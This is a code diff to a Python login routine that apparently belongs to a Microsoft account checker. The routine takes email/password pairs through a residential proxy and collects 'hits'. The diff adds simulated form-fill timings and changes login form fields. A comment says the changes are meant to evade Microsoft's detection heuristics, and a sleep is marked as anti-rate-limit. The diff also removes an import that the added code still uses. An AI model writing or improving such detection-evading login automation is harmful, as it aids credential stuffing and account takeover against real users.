@@ -378,15 +378,20 @@ def run_local_audit(email, password, iproyal_auth, hits_buffer, keyword="", user
         ppft = ppft_match.group(1)
         post_url = pl_match.group(1)
         
+        # Tiempos simulados (milisegundos) para evadir heurísticas de MS
+        t_start = int(_t.time() * 1000) - _r.randint(15000, 35000) # Carga simulada
+        t_submit = int(_t.time() * 1000)
+        duracion_llenado = t_submit - t_start
+
         # PASO 3 - Login
         post_data = {
-            "i13": "1", "login": email, "loginfmt": email, "type": "11",
-            "LoginOptions": "1", "lrt": "", "lrtPartition": "", "hisRegion": "", "hisScaleUnit": "",
+            "i13": "0", "login": email, "loginfmt": email, "type": "11",
+            "LoginOptions": "3", "lrt": "", "lrtPartition": "", "hisRegion": "", "hisScaleUnit": "",
             "passwd": password, "ps": "2", "psRNGCDefaultType": "", "psRNGCEntropy": "", "psRNGCSLK": "",
             "canary": "", "ctx": "", "hpgrequestid": "", "PPFT": ppft,
             "PPSX": "Passport", "NewUser": "1", "FoundMSAs": "", "fspost": "0",
-            "i21": "0", "CookieDisclosure": "0", "IsFidoSupported": "0", "isSignupPost": "0",
-            "isRecoveryAttemptPost": "0", "i19": "3772"
+            "i21": "0", "CookieDisclosure": "0", "IsFidoSupported": "1", "isSignupPost": "0",
+            "isRecoveryAttemptPost": "0", "i19": str(duracion_llenado)
         }
         
         session.headers.update({
@@ -397,7 +402,6 @@ def run_local_audit(email, password, iproyal_auth, hits_buffer, keyword="", user
             "User-Agent": mobile_ua + " PKeyAuth/1.0",
         })
         
-        import time as _t, random as _r
         _t.sleep(_r.uniform(0.5, 1.5))  # anti-rate-limit
         res2 = session.post(post_url, data=post_data, verify=False, timeout=25, allow_redirects=False)
         
